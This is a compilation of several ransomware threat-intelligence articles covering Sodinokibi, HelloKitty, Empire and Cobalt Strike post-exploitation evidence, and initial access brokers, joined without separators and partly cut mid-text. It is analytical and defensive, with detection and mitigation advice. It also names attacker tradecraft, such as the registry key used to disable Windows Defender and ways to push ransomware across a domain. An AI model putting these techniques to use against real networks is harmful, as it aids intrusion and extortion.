traffic from servers over web application protocols. These techniques\nallow cyber criminals to bypass firewall restrictions when they move into the data collection\nand exfiltration stage.\n\nFigure 10: RDP tunneling evidence in Windows Event Logs\n\nExfiltrating data is a critical part of how ransomware gangs build leverage. They use the\nstolen data to extort the victimized company if the latter chooses to forego payment for a\ndecryption key.\n\nStage 4: Data Collection and Exfiltration\n\nLike many other ransomware operators, Sodinokibi operators incorporate data exfiltration as\npart of a double extortion tactic to increase the probability of a payment as a result of the\ncompromise.\n\nX-Force IR observed that Sodinokibi operators often access remote file shares to stage data\nto a single compromised system and leverage tools such as Rclone, MegaSync, MegaCmd\nand WinSCP to exfiltrate data from the compromised environment.\n\nhttps://www.sdxcentral.com/articles/news/did-covid-19-usher-in-cybercrimes-golden-age/2021/03/\n\n\n9/13\n\nDuring investigations of Sodinokibi ransomware incidents, X-Force has determined that the\nthreat actors spend most of the compromise within the data collection and exfiltration phase.\n\nDuring one Sodinokibi incident X-Force investigated, the operator spent nine days\nperforming data collection and exfiltration out of a total of eleven days from the point the\nactor established interactive access to the network.\n\nThe types of data Sodinokibi operators target include:\n\nPoint of sale (POS) data that includes payment card data\nSupervisory Control and Data Acquisition (SCADA) data\nData marked ‘confidential’\nInitial Public Offering (IPO) or stock market data\nIntellectual property (IP) (e.g. source code, Gitlab backups, etc.)\nPayment card information (PCI)\nPersonally identifiable information (PII)\nProtected health information (PHI) (e.g. ultrasound, patient prescription details, mental\nhealth summaries, etc.)\nFinancial planning and investment\nAccounting data\nHuman resources (HR) data\nInternal communications\nBackups\nClient data\nPassports\nCustomer contracts\nVendor sensitive data\n\nStage 5: Ransomware Deployment\n\nAfter completing the data exfiltration phase, the Sodinokibi operators will leverage their\nprivileged access to pivot to access a compromised domain controller.\n\nFrom the domain controller, the threat actor can stage ransomware and then deploy it using\ndomain administrator credentials via PSExec, server message block (SMB) protocol and\ngroup policy object (GPO). Use of GPO in multiple Sodinokibi attacks has enabled threat\nactors to also disable Microsoft Windows Defender to inhibit target protections against the\nransomware.\n\nIn one Sodinokibi ransomware incident that X-Force investigated, after completing the\nexfiltration of 92 GB of data through the Rclone tool, the threat actors accessed a domain\ncontroller through RDP and created a new GPO which modified the following registry key to\ndisable Windows Defender.\n\n\n\n10/13\n\nHKLM \\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware\n\nThe threat actors then linked the new GPO to the root of the domain and created eight new\nline-separated text files containing 8,771 hostnames from Active Directory.\n\nOnce Windows Defender was disabled, the threat actor created eight BAT files in the\nC:\\Windows directory.\n\nX-Force IR recovered these binaries and determined that they loop through the eight\npreviously mentioned text files, authenticate to each host using a service account via the\nSMB protocol, copy a DLL to the C:\\Windows directory and use the Windows Management\nInstrumentation (WMI) utility to execute the DLL with Rundll32.exe on the target host.\n\nX-Force malware analysts confirmed the DLL as a Sodinokibi ransomware payload.\n\nFigure 11: BAT file “wmi4.bat” that the attacker used to deploy ransomware using WMI\n\nInvestigation: Where Intelligence and Incident Response Meet\n\nWhile assisting IBM clients with remediating Sodinokibi ransomware attacks, X-Force threat\nintelligence has provided context, research and assistance to the incident response team\nthat has enhanced investigation and informed remediation.\n\nIn some cases, intelligence analysts have been able to pivot on a single indicator of\ncompromise (IOC) from an attack and, through research and enrichment, pave the way for\nadditional analysis. These capabilities illuminate new systems for investigation and open\ndoors for the incident response team that would otherwise have remained closed.\n\nThis process is mutually beneficial, as it also provides threat intelligence teams with\nadditional insight on threat actors and indicators for detecting them. For example, an IR\nrequest for intelligence to examine one internet protocol led to insight on a recent phishing\ncampaign connected to several different email addresses. At the same time, the team\npointed to Transmission Control Protocol (TCP) scanning activity and threat actor activity\nrelated to both ransomware attacks and Trojan infections.\n\nIn addition to IOCs, the X-Force threat intelligence team closely tracks the TTPs associated\nwith dozens of threat groups, including ransomware groups and their affiliates. These TTPs\nare changing rapidly, and as threat intelligence teams identify changes they can relay these\nshifts to incident response consultants working on related cases.\n\n\n\n11/13\n\nThe availability of IR and intelligence professionals that tag team is a process that augments\nforensic analysis and enables consultants to search artifacts for specific TTPs. They can also\nidentify more suspicious activity that is most likely to be relevant to the investigation. For\nexample, Sodinokibi’s exploitation of a zero-day and supply chain attack involving Kaseya in\nearly July 2021 represented a significant shift in the group’s behavior that altered X-Force\nIR’s examination of initial infection vectors for Sodinokibi attacks.\n\nIn some cases, intelligence insight can warn of potential Sodinokibi activity. For instance, in\none incident IR investigated, even before any malware was found, intelligence analysts\nnoted that some identified IPs and use of Rclone could be indicative of precursor activity to\nransomware deployment — and specifically Sodinokibi. Fortunately, defenders were able to\nidentify and remediate the activity quickly and the attackers never reached the ransomware\ndeployment stage in this operation.\n\nRemediation: Shoring Up Potential Victims Against Future Attacks\n\nX-Force IR has assisted numerous clients with containing ransomware attacks, eradicating\nthreat actors from compromised networks and recovering business operations. Once an\nincident is fully contained, organizations commence the recovery effort — often a complex\nundertaking that requires strong cross-functional collaboration.\n\nIn many cases, rebuilding or restoring the compromised systems according to the incident\ntimeline is the first step in recovery, but recovery alone is not sufficient. Organizations need\nto reduce their attack surface and remediate security weaknesses exploited by the threat\nactor to minimize the risk of similar attacks occurring in the future. Our team has assisted\nmany clients with these activities, providing recommendations on controls to improve the\noverall security posture of any network.\n\nSome of the short-term controls frequently recommended by X-Force include:\n\nDeploying a local administrator password solution (LAPS)\nReducing the SMB protocol’s attack surface\nHardening systems against credential harvesting attacks\nProhibiting workstation and server logins with enterprise administrator (EA) and domain\nadministrator (DA) credentials\nDeploying a secure administrative host for access to trusted security zones\nMonitoring elevated privilege accounts, including service accounts\nDeploy an endpoint detection and response (EDR) tool\n\nIn the medium term, X-Force often recommends that victims focus on designing a delegation\nmodel, enforcing the principle of least privilege for security principals and separating\nadministrative credentials into administrative tiers. Privileged accounts should always be\nprotected by strong passwords and a multi-factor authentication scheme.\n\nhttps://us-cert.cisa.gov/kaseya-ransomware-attack\n\n\n12/13\n\nIn the longer term, potential ransomware victims might want to explore a range of options\nthat would enhance the security posture of the network and minimize the risk of successful\nnetwork intrusion by ransomware operators. Some of the controls include:\n\nDeveloping a vulnerability management program\nSegmenting an internal network to reduce the possibility of lateral movement\nImplementing privileged access management (PAM) to manage and secure the\ncredentials for privileged accounts, including users with elevated privileges, local and\nActive Directory (AD) accounts, system administrators and super users, service\naccounts and application accounts, among others.\nImplementing multifactor authentication (MFA) to enhance security in scenarios where\nthe risk of compromised credential use is the greatest.\n\nKeep up to date on IBM X-Force blogs and emerging research here.\n\nIf your organization requires assistance with incident response and intelligence services, IBM\nX-Force stands by 24/7.\n\nUS Hotline: 1-888-241-9812\n\nGlobal hotline: +001 (312) 212-8034\n\nCamille Singleton\nManager, X-Force Cyber Range Tech Team, IBM\n\nCamille Singleton brings sixteen years of professional experience to cybersecurity topics,\nboth in the US government and as an analyst at IBM.

In\nthis second part we will pick up where we left off: the attacker has a foothold on the network\nby controlling an infected host or has a valid account to access a remote service.\n\nhttps://www.mcafee.com/blogs/other-blogs/mcafee-labs/csi-evidence-indicators-for-targeted-ransomware-attacks-part-ii/\nhttps://www.mcafee.com/blogs/other-blogs/mcafee-labs/csi-evidence-indicators-for-targeted-ransomware-attacks/\n\n\n2/7\n\nFigure 1 Adversary has a beachhead\nWith either a valid account or having access towards a system in a company, the first two\nthings you want to figure out are:\n\n1. What kind of rights do I have from this machine?\n2. Where the heck am I in this network?\n\nOne of the first commands you would observe as a responder is “whoami/all”. The output of\nthis command will give the details of the account the attacker has on the machine with\nregards to group/privileges. A great way to detect suspicious activity in your network is to\nsetup a detection rule for the “whoami” command and assign it to the assets in use by\nexecutives or holders of key positions in the company. There might always be a techie\nexecutive in the company but most of them will never use command or use a command-line.\n\nIn the context of the targeted ransomware attacks, the attacker preferably wants to have\nlocal-admin/domain-admin and or system rights. Those will be the keys to the kingdom and\nopen all gates.\n\nIn the next step, mostly observe some variant from Mimikatz or other password-dumping\ntools that will dump the credentials from a machine. Either the tool Mimikatz is compiled in\nvarious formats or it is part of a remote PowerShell toolkit like Empire:\n\n\n\n3/7\n\nFigure 2 Empire Mimikatz (source powershellempire.com)\nWe began this article series with the fact that every touch of a system will leave digital\nfootprints behind, in this example with Empire, the following is happening:\n\nAttacker has a connection to a system through usage of a ‘launch script’\nAttacker is using a C2 (command and control) to interact\nAttacker is using PowerShell to execute commands\n\nFrom a MITRE ATT&CK Techniques perspective we would look at this overview of\ntechniques and interaction:\n\n\n\n4/7\n\nFigure 3 Attacker using Empire\nWhich stages and evidence sources will create visibility and early warning indicators?\n\nFor PowerShell usage there are several digital evidence locations available. Besides traces\nin memory, there can be traces discovered in the Windows Event logs, the Registry, on the\nfile-system like the Prefetch directory and there’s even a PowerShell command history file\navailable if a version of PowerShell v5 and above is used. That location can be found at:\n\nC:\\Users\\<username>\\AppData\\Roaming\\Microsoft\\Windows\nPowerShell\\PSReadline\\ConsoleHost_history.txt\n\nEmpire by design is encrypting its communications, makes infrequent and randomized\nconnections and, last but not least, is mirroring HTTP activity to stay hidden in the ‘normal’\ntraffic. If we look at the order of volatility from our first article, network traffic will change from\nseconds to minutes, giving us a very short window unless we do full packet capture and\ninspection of our network traffic.\n\nThe network activity might be challenging to notice, however there are possible indicators\nthat can help possible Empire traffic. To setup the C2 traffic, the attacker needs to configure\na ‘listener’ that contains all the settings for the C2 traffic interaction.\n\nFigure 4 Empire Listener setup\n\n\n\n5/7\n\nIn the partial setup screen in Figure 4, we see three URI’s being configured that will be\nfrequently requested and combined with an HTTP Header. A combination detection of the\nthree URI’s polled within x timeframe combined with the HTTP header could be a very good\nnetwork-indicator to detect Empire C2 traffic. As a responder, when you detect these\nindicators, look back at Figure 3 and start hunting backwards. You discovered the C2 activity,\nbut it means the hosts who are interacting with the C2 have PowerShell activity and time to\nsecure your evidence. This is how I like to apply the MITRE ATT&CK model:  understand\nwhat you just discovered, and the implications  then hunt for evidence or anticipate the\nattacker’s next step and act.\n\nKeep in mind this is a default setup and can be changed by the attacker. Experience\nsuggests that cyber-crime motivated actors are in a hurry for the cash and use a default\ninstallation of tools, whereas nation-state cyber-espionage operations are customizing since\nthey want to operate longer in a victim’s network.\n\nNow back to our scenario. The attacker has acquired the right privileges and has laterally\nmoved through the network to have an idea how large it is and have possibly identified\ncritical assets — they love shared folders with a lot of data in them.\n\nThe attacker will next prepare a custom version of the ransomware and could have tested it\non underground AV-testing services to make sure that it will be fully undetectable (FUD).\nDepending on skills and capabilities, the ransomware will either be uploaded to the victim’s\nnetwork or using scripts distributed and executed over the network. We have observed cases\nwhere a series of .bat scripts were used and where the payload was downloaded from\nPastebin and executed by PowerShell on hosts – enough variety and options. Once\nexecuted,  the first calls will come into the Helpdesk reporting the ransom notes.\n\nA lot of the above techniques are available within post exploitation frameworks, of which\nthere are several options that attackers can choose from. With any of these, the tool is only a\nconduit and we should always focus on detecting techniques rather than implementation\nspecifics. Available options come in the form of both underground toolkits and penetration\ntest tools designed to build awareness around the attacks. Unfortunately, those designed as\nsecurity tools may also be used for nefarious purposes. This ‘chicken and egg’ situation is\noften the cause of heated debate since on one hand the tools can streamline attack\nscenarios, while on the other, without having them available to defenders, adequate testing\nof precautions is impossible.\n\nEmpire was mentioned above. This excellent PowerShell-based post-exploitation framework\nis no longer maintained or supported by its authors. Although forks exist, traction has slowed\nbut its use is still detected. Cobalt Strike, a commercial adversary simulation platform\nregularly used by red teams to test infrastructural security measures and detection capacity,\nis increasingly being adopted by criminal actors.” Although its license is strictly controlled,\npirated and cracked trial versions are available in the criminal underworld. Cobalt Strike is\n\nhttps://attack.mitre.org/software/S0154/\nhttps://blog.fox-it.com/2019/02/26/identifying-cobalt-strike-team-servers-in-the-wild/\nhttps://attack.mitre.org/software/S0154/\n\n\n6/7\n\nupdated regularly to include the latest techniques and tools such as Mimikatz, while allowing\na lot of flexibility for addition of new and unique attack and bypass techniques. This can\nincrease the likelihood of success, even on the most recent operating system versions.\n\nThreat groups distributing GoGalocker, MegaCortex and Maze ransomware have been\nobserved utilizing Cobalt Strike. At this stage in our scenario, with a foothold on the network,\nCobalt Strike provides many options which can be used to complete their objective. These\ninclude T1075 Pass the Hash, T1097 Pass the Ticket, T1105 Remote File Copy, T1021\nRemote Services and the old reliable: T1077 Windows Admin Shares.\n\nAs detailed in part 1, this evidence remains on a system for differing time spans. By studying\nprevious attacks, we can see a general mode of operation and a sequence in which these\ntechniques are executed. This can help guide us when choosing the timing and methods of\nevidence collection.\n\nDetection of these attacks is not an easy task. Exploitation frameworks are often open\nsource, in which case the attacker can modify code to manipulate IOC’s (indicators of\ncompromise). Alternatively, and as is the case for our example, Cobalt Strike, the framework\nwill provide specific configuration around the final form of binary droppers, network traffic\nformat, timing and specific parameters, etc. Therefore, generic signatures will only detect the\nmost basic of attacks and, as previously mentioned, focusing on techniques and behaviors\nrather than tools becomes critical. Creating a Cobalt Strike generic detection may miss the\npoint of its existence – education around malicious techniques and behaviors. However, we\ncan learn a lot about various indicator categories that can be monitored for functional outliers\nand unusual behaviors and, where the tool is merged into malware strains, the markers for\nthat specific instance can often become specific IOC’s.\n\nIn a lot of cases, understanding normal system behavior is crucial for uncovering outliers and\nhaving a baseline system for comparison can aid the analysis.\n\nA few examples of these include:\n\nMemory\nThe holy grail. Binary droppers may be modified to mask their true intentions,\nhowever in memory they can be visible in a decoded format.\nSearch for markers of functionality such as suspicious system calls or\nreads/writes of sensitive system locations (e.g. lsass memory).\n\nRunning Processes\nSimilarly, running processes can be very revealing.\nAlthough process ‘migration’ is often carried out, review for abnormal process\nhierarchies.\nDoes the process carry out functionality that is not expected? E.g. does notepad\nmake http requests to an external domain?\n\nhttps://www.mcafee.com/blogs/other-blogs/mcafee-labs/csi-evidence-indicators-for-targeted-ransomware-attacks/\n\n\n7/7\n\nNetwork Traffic\nDomains should match known-good.\nSpikes or regular timing patterns in traffic type or to specific servers.\nVariables used in unusual manner, e.g. http headers including encoded binary\ndata.\n\nDisk\nBinary and configuration files available for reverse engineering.\nThis static analysis is not as powerful as dynamic, running software.\nDebugging a malicious binary may help but beware of sandbox/debugger\ndetection.\n\nBackup / Log Files\nNever fully trust log files as attackers can easily falsify. External sources, e.g.\nsyslog going to an external db, can improve the reliability of log data if available.\nSearch for specific markers for malicious activity. Some useful items to include:\ncommand line logs, PowerShell script block logging, specific logs for network\napplications such as web servers, service installation, share accessed –\nparticularly C$, process launch, account login.\n\nAs we highlighted in the two articles, targeted ransomware attacks have increased massively\nover the past 8 months. Targeting MSPs to hit many at the same time, victims running critical\noperations, public services, etc. Many of them are all using a similar blueprint as we tried to\nhighlight.\n\nLearn from the articles, identify which technology can give you that visibility, what digital\nevidence sources do you have, and can you detect fast enough to preserve and respond? If\nthe ‘initial access stage’ is passed, where can you pick up in your line of defense and stop\nthe threat?\n\nStay tuned for part 3, where we discuss technical controls that are available to help your\norganization to react to these early warning signs within an acceptable timeframe.\n\nChristiaan Beek Lead Scientist & Sr. Principal Engineer\nChristiaan Beek is the Lead Scientist & Sr. Principal Engineer of the Enterprise Office of the\nCTO.

      "plain_text": "1/11\n\nFebruary 10, 2021\n\nPunk Kitty Ransom - Analysing HelloKitty Ransomware\nAttacks\n\ncadosecurity.com/post/punk-kitty-ransom-analysing-hellokitty-ransomware-attacks\n\n \nBlog\n\nFebruary 10, 2021\n\nYesterday, the company behind the gaming blockbuster Cyberpunk 2077 announced that it\nhad been hit by a ransomware attack and the hackers claimed to have stolen source code\nfor upcoming games. The most likely culprit at this time of the known ransomware groups is\na group known as HelloKitty.\n\nBelow we have taken a look at previous HelloKitty attacks, and found a trail of victims.\nPrevious attacks include potentially dangerous code to kill applications, including Industrial\nControl Systems. We also found links to earlier notable ransomware attacks.\n\nBackground\n\nYesterday CD Projekt Red revealed they had fallen victim to a ransomware attack:\n\nhttps://www.cadosecurity.com/post/punk-kitty-ransom-analysing-hellokitty-ransomware-attacks\nhttps://twitter.com/fwosar/status/1359167108727332868\nhttps://twitter.com/CDPROJEKTRED/status/1359048125403590660/photo/1\n\n\n2/11\n\n“”An unidentified actor gained unauthorized access to our internal network, collected certain\ndata belonging to CD PROJEKT capital group, and left a ransom note the content of which\nwe release to the public.”\n\nThey join a number of other gaming companies to have recently suffered the same fate.\n\nThe ransomware note shared by CD Projekt Red\nThe Emsisoft CTO has suggested this may be the work of HelloKitty ransomware. That is\nbased on the ransomware note and rare filename, and they caveat that it’s not possible to be\nsure without seeing the ransomware itself. We’d concur with that caution. Whilst the notes\nare certainly familiar (as shown below) – they are custom for most victims and not an exact\nmatch. As an anti-virus with a track record of ransomware analysis, it’s likely Emsisoft has\nseen samples of HelloKitty that we have not and have included that in their assessment.\n\nWith those caveats in hand – we took a look at previous HelloKitty attacks below.\n\nMost Recent Attacks\n\nThe most recent attack we’ve seen from HelloKitty targeted a UK Healthcare organisation at\nthe end of January 2021. Below is the ransomware note, with the name of the targeted\norganisation redacted:\n\nhttps://www.wired.com/story/cd-projekt-red-ransomware-hack-cyberpunk-2077-source-code/\nhttps://www.bbc.co.uk/news/resources/idt-sh/hated_and_hunted_the_computer_virus_malware_ransomware_cracker\nhttps://twitter.com/fwosar/status/1359167108727332868\nhttps://blog.emsisoft.com/en/37783/hellokitty-ransomware-group-likely-responsible-for-cd-projekt-attack-heres-why/\n\n\n3/11\n\nIt goes without saying that it is particularly irresponsible to be deploying targeted\nransomware to organisations that provide key medical services during a global pandemic.\n\nChristmas 2020 Attacks\n Attackers are well aware of the importance timing can make to the impact of their attacks.\n\nNotably, Russian attackers successfully disabled Ukranian power networks for two\nconsecutive Christmas Eve’s. The timing both left thousands of families without power on\nChristmas day, and only a skeleton crew at the power company to respond.\n\nWe’re aware of at least two, and likely more, attacks that HelloKitty delivered on Christmas\nDay 2020. They likely had access for some time before, but chose to deploy their\nransomware on Christmas day for maximum impact.\n\nThe first has previously been reported on. At Christmas 2020 the Brazilian powerplant\noperator CEMIG disclosed on Facebook that they had fallen victim to a ransomware attack:\n\n“CEMIG informs that on December 25, 2020, the SOC (security operation nucleus) detected\nanomalous behavior on the internal network, with characteristics of a malicious ransomware\nattack. The teams responsible for the correct detection of the attack and subsequent\nadoption of the containment measures were immediately activated.\n\nLess than 10% of servers on the Windows / Microsoft Hyper-V platform had their content\nencrypted. Workstations have also been partially compromised and are in the process of\nbeing verified. It is important to highlight that, thanks to the fast and effective containment\naction carried out by Cemig, the operation of the electrical system and the main databases\n(customers, billing, customer service and business management) were not compromised,\nthus guaranteeing the provision of services to our clients.”\n\nhttps://www.wired.com/story/crash-override-malware/\nhttps://en.wikipedia.org/wiki/CEMIG\nhttps://www.cisoadvisor.com.br/ataque-de-ransomware-na-cemig-derruba-sites-e-atendimento/\n\n\n4/11\n\nThe statement about the Hyper-V platform matches the ransomware note we’ve seen linked\nto the attack:\n\nThe CEMIG Ransomware note\nReportedly, CEMIG had restored their system within four days.\n\nAs normal with targeted ransomware, the attackers provided a chat link for CEMIG. The\nconversation was captured by the site ID Ransomware (RU). Based on the conversation, we\nthink it is unlikely that CEMIG* decided to pay the ransom:\n\nhttps://www.cisoadvisor.com.br/cemig-foi-atacada-pelo-kitty-ransomware-servicos-inoperantes/\nhttps://id-ransomware.blogspot.com/2020/11/hellokitty-ransomware.html\n\n\n5/11\n\n* Other analysts have pointed out that given the payment link was made public, this may not\nbe CEMIG communicating with Hello Kitty.\n\nBut CEMIG was not the only target at Christmas. We’ve seen another HelloKitty ransomware\nnote from a different target that was uploaded to the site VirusTotal.com on Christmas day\n2020:\n\nhttps://twitter.com/malwrhunterteam/status/1359974313668071425\n\n\n6/11\n\nThe ransom note to a French IT service (we have redacted the name)\nApplication Termination\n\nOne sample of HelloKitty, compiled on 26th December 2020, contains a large list of\napplications to terminate:\n\nhttps://www.virustotal.com/gui/file/02a08b994265901a649f1bcf6772bc06df2eb51eb09906af9fd0f4a8103e9851/community\nhttps://otx.alienvault.com/indicator/file/fa722d0667418d68c4935e1461010a8f730f02fa1f595ee68bd0768fd5d1f8bb\n\n\n7/11\n\nWe were disturbed to see terminated applications included Industrial Control System\nsoftware such as GE Proficy and Honeywell HMIWeb. Investigating this list, it appears it is\ncopied from the MegaCortex/Ekans/Snake ransomware.\n\nWhen the MegaCortex list was first identified it generated significant concern about the\nimpact it could have on SCADA systems. However, more day to day applications such as\nbackup software and accounting software are also terminated. As researchers noted at the\ntime – the attackers seem concerned with stopping any software that may limit its impact,\nrather than specifically targeting SCADA.\n\nNonetheless it is concerning to see such careless code in a sample of malware, which was\ncompiled at the same time that a Powerplant operator was enduring their attack.\n\nLinks to Earlier Campaigns\n\nWe quickly found links to the “TechStrat” ransomware identified in October 2020. The\nransomware note is named the same (“read_me_lkdtt.txt”) as many HelloKitty ransomware\nnotes. And the note itself is very similar to the note that was deployed to CEMIG:\n\nhttps://www.ge.com/digital/applications/proficy-historian\nhttps://www.honeywellprocess.com/en-US/support/_layouts/honeywell/hps/support-product.aspx?column=Releases&PN=HMIWeb%20Solutions\nhttps://www.wired.com/story/ekans-ransomware-industrial-control-systems/\nhttps://www.acronis.com/en-us/blog/posts/snakeekans-ransomware-attacks-industrial-control-systems-acronis-stops-it\nhttps://www.dragos.com/blog/industry-news/ekans-ransomware-and-ics-operations/\nhttps://isarc.tachyonlab.com/3429?category=836647\n\n\n8/11\n\nDecompiling the code of a sample, shows it to also be extremely similar to other HelloKitty\nsamples. It also contains the code to kill a range of applications that was borrowed from\nMegaCortex.\n\nIn addition, we (and others 1, 2) spotted possible overlaps with an earlier family called\n“DeathRansom”. A quick review is shown from Intezer’s analysis and Antivirus vendors often\ndetecting both HelloKitty ransomware binaries and notes as DeathRansom:\n\nIf so, that may be particularly interesting given that Fortinet tracked down the DeathRansom\nauthor in an involved blog post in January 2020.\n\nAdditionally, Emsisoft caveat here:\n “Some analysts may refer to HelloKitty as DeathRansom, a strain of malware that was\n\noriginally only capable of renaming files. Different versions of DeathRansom were later\ndeveloped that could encrypt files in various ways. However, the relationship between\nDeathRansom and HelloKitty is still not fully clear.”\n\nIn Closing\n\nIt’s clear that HelloKitty is yet another set of targeted ransomware operators that have moved\nto threaten their victims with impact going beyond the immediate destruction of data. If they\nare indeed linked to the earlier DeathRansom attacks, they have improved significantly from\ntheir initial forays into ransomware. The first version didn’t even encrypt anything. We have\nprovided some suggested mitigation strategies below.\n\nMitigation\n\nhttps://github.com/cado-security/hellokitty-ransomware\nhttps://twitter.com/chrisdoman/status/1359223448803938310\nhttps://twitter.com/Arkbird_SOLG/status/1359277491559481345\nhttps://twitter.com/tylabs/status/1359210228676370432\nhttps://analyze.intezer.com/files/fa722d0667418d68c4935e1461010a8f730f02fa1f595ee68bd0768fd5d1f8bb\nhttps://www.fortinet.com/blog/threat-research/death-ransom-attribution\nhttps://blog.emsisoft.com/en/37783/hellokitty-ransomware-group-likely-responsible-for-cd-projekt-attack-heres-why/\nhttps://www.zdnet.com/article/deathransom-evolves-from-joke-to-actual-ransomware/\n\n\n9/11\n\nWe have included a number of mitigation strategies that Cado Security recommends both for\nHelloKitty and ransomware in general:\n\nConsider utilising separate IT systems (privileged access workstations) for used by\nnetwork and system administrators. For these systems, utilise additional two-factor\nauthentication and ensure there is no direct access to the Internet.\nConsider employing an “allowed list” to restrict server outbound communications to IP’s\n/ Domains that they need access to.\nConsider storing backups of key business and critical IT infrastructure systems e.g.\nActiveDirectory, off of your network.\nAvoid opening up RDP services to the internet, if it’s required consider using an\nALLOW LIST approach only, and DENY all unknown IPs by default.\nEnsure you have the ability to restore to a segregated network environment.\nEnsure you have tested the restore capabilities of your backups.\n\nBoth the UK NCSC and ICS-CERT provide more extended mitigations for destructive\nattacks.\n\nAbout Cado Security\nCado Security specialises in providing tooling and techniques that allow organisations to\nthreat hunt and investigate cloud and container systems.

This report includes information gathered using the \nRecorded Future​®​ Platform, dark web sources, and open-source intelligence \n(OSINT) techniques. This is a high-level summary of the chain of events that \nenable a ransomware attack. It is intended to provide an overview for cybersecurity \nprofessionals with non-technical backgrounds or roles.\n\nExecutive Summary\nThreat actors can gain initial access to networks through \n\ninfostealer malware infections, initial access brokerage services \non dark web and special-access forums, or the purchase of \ninfostealer logs from dark web shops and marketplaces. Other \nattack vectors, such as phishing, spearphishing, and code \ninjection, are also common on dark web and special-access \nforums, but their immediate effects are often much less public \nand visible than the sale of compromised credentials. Using \nBlackMatter and Conti as examples, we examine the role of \ncredential access in the execution of the attack, from initial \naccess to ransomware deployment. We provide mitigations \nfor credential breaches, infostealer malware infections, and \nransomware attacks, as well as our assessment of the future of \nthese tools and the larger ransomware threat landscape.\n\nKey Judgments\n•\t To conduct a successful ransomware attack, threat \nactors require remote access to compromised networks. \nThe most common method by which threat actors \nobtain access is through the use of compromised valid \ncredential pairs, which are often obtained via infostealer \nmalware and sold on dark web and special-access \nsources.\n\n•\t Compromised credentials are often sold on dark web \nand special-access forums and shops to ransomware \naffiliates, who use such access to move laterally through \nsystems, escalate privileges, and use malware loaders to \ndeploy ransomware.\n\nBackground\nThreat actors require remote access to compromised \n\nnetworks to conduct successful attacks, such as malware \nloader deployment, data exfiltration, or espionage campaigns. \nThese compromised access methods, often sold on dark web \nand special-access forums, are the work of specialized threat \nactors colloquially referred to as “initial access brokers” (IAB). \nIABs use several tools and TTPs to obtain such access, including \nobtaining valid credential pairs and session cookies from the \nsuccessful deployment of infostealer malware, the purchase \nof infostealer “logs” or “bots” on dark web shops, credential \nstuffing, adversary-in-the-middle attacks, phishing, remote \ndesktop protocol (RDP) “brute force guessing”, and more.\n\nThe most common credential pairs that appear for sale or \nauction on top-tier dark web and special-access sources, such \nas Exploit and XSS, are for corporate virtual private networks \n(VPNs), RDP services, Citrix gateways, web applications and \ncontent management systems (CMS), and corporate webmail \nservers (business email compromise, or BEC). Less common, \nbut more sought-after, are ESXi root and Active Directory (AD) \naccess methods, zero-day and n-day vulnerabilities, code \ninjection points (HTML, SQL), and others. This report will outline \nthe typical process by which an initial access broker obtains \ncompromised access methods and sells them on dark web and \nspecial-access sources, and the use of such methods to conduct \na successful ransomware attack.\n\nCYBER THREAT ANALYSIS\n\nhttp://www.recordedfuture.com\n\n\nwww.recordedfuture.com | Recorded Future®  CTA-2022-0802 2\n\nThreat Analysis\nOne of the most effective ways for ransomware operators to \n\ngain access to victim networks is by either deploying infostealer \nmalware or obtaining logs exfiltrated by an infostealer on a \ndark web or special-access source. This malware is deployed \nthrough the use of acquired or compromised botnets, phishing, \nthe successful deployment of an obfuscated malware loader or \ndropper, or through the purchase of compromised credentials \non dark web and special access sources.\n\nCompromised Valid Credentials\n\nTo easily obtain bulk compromised valid credentials and \nsession cookies, threat actors often rent access to a licensed \naccount for an infostealer malware. These licenses come in many \nforms, but most often as web panels, source code, builders, \nor standalone clients. Infostealers are often marketed directly \nby their developers as a malware-as-a-service (MaaS) offering \non top-tier dark web and special-access sources, messaging \nplatforms (such as Telegram), and social media. The information \nharvested from infostealers, colloquially referred to as “logs” or \n“bots”, is then sold on dark web shops, such as Genesis Store, \nRussian Market, the now-defunct Amigos Market, and 2easy \nShop. The most common infostealers that appear on dark web \nand special-access sources are RedLine, Vidar, FickerStealer, \nTaurus, AZORult, and the now-defunct Raccoon.\n\nDeploying Stealers\n\nInfostealers, generally considered to be a subgroup of \nthe banking or remote access trojan (RAT) malware category, \ncan capture a great amount of compromised information from \nan infected device, including keystrokes and peripheral input \ncaptures, session cookies, usernames and passwords from \nbrowser stores, screen and video captures, local data, browser \nhistory and bookmarks, clipboard data, and more. The most \ncommon attack vectors by which infostealers spread is through \nspam campaigns or phishing. Less commonly, but as evidenced \nby the rapid spread of Mars Stealer in Q1 2022, infostealers can \nspread via malicious Google Ads and pop-ups. These infostealer \npayloads can be disguised within Microsoft Office documents \nthrough the use of malicious macros; a dropper that encrypts \nthe payload as extra data; or a loader that communicates with \nits command and control (C2) infrastructure over a web protocol \nand uses a built-in command and scripting interpreter to remotely \nexecute code. Once an infostealer successfully infects a victim \ndevice, it begins to log activities and collect compromised \ninformation. These logs are then manually examined by the \ninfostealer operator for credentials that might be profitable (for \nexample, credentials for tools or platforms like RDP, VPNs, or \nWordPress) on dark web or special-access sources. At this point, \nan infostealer operator could become an initial access broker for \nransomware and data leak groups on dark web forums.\n\nFigure 1: Examples of web panel dashboards for infostealer malware, including Mars (left) and RedLine (right) (Source: Recorded Future)\n\nCYBER THREAT ANALYSIS\n\nhttp://www.recordedfuture.com\n\n\nRecorded Future® | www.recordedfuture.com CTA-2022-08023\n\nInitial Access Brokers\n\nStolen credentials are often sold to ransomware affiliates \non dark web and special-access forums by specialized \ncybercriminals called initial access brokers (IABs). While most \nhigh-profile accesses are brokered on top-tier Russian-language \nforums, such as Exploit, XSS, or RAMP, it is still possible to \nencounter IABs on low-tier or mid-tier English-speaking forums, \nsuch as BreachForums or the now-defunct Raid Forums. IABs \ncommonly operate in multiple languages on different forums, \noften under different monikers (for example, “FuckerZ” connects \nto “Tokugaw4”, “tokugawa”, “xssisownz”, and “Str0ng3r”), to \navoid detection, tracking, and arrest. Many English-language \ncybercriminal forums, such as Cracked or Nulled, have banned \nIAB services and ransomware discussions outright, as the risk \nof law enforcement attention on the forum increases with such \nactivity. Less commonly, ransomware operators and affiliates will \nwork directly with a designated group of IABs that will conduct \nbusiness off of the forums and in private messaging channels, \nsuch as Tox or XMPP (Jabber).\n\nIAB advertisements follow a similar pattern on dark web \nand special-access forums. The template is loosely as follows: \n“victim country”, “annual revenue”, “industry”, “type of access”, \n“rights”, “data to be exfiltrated”, and “devices on local network”. \nAdditional useful information includes the type of antivirus \nsoftware, IP address ranges, and other details. On top-tier \nforums, sellers are typically required by the forum’s rules to \nprovide a sale price in the initial advertisement. As many of these \ndeals are negotiable, with price ranges varying widely depending \non multiple factors, the most common form of advertisement is \nthe “auction” format. IABs will provide an acceptable starting 